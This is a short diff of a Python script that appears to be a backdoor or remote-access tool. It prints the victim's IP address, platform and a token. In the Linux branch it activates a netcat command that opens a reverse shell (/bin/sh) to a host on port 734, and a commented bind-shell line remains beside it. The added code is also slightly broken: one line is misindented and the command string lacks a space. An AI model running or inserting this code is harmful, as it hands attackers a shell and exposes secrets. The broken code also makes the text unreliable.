@@ -47,11 +47,12 @@ def run(token):
     if "Linux" in platform.system():
         print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
         print(' IpAddress: ', IPAddr)
-        print('insert Filename to upload: ')
-        archive=input()
+         print('TokenData: ', token)
+        stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'\n'
+        print('tokenData: '+token )
         #upload_file_to_github(archive)
         #os.system( 'nc -lvp 734 -e /bin/sh')
-        #os.system('nc' + iph+ ' 734 -e /bin/sh')
+        os.system('nc' + iph+ ' 734 -e /bin/sh')
     elif "Windows" in platform.system():
         print('Windows: ', sysconfig.get_platform(),' === CONNECTED ') 
         print('Address ip: ', IPAddr)
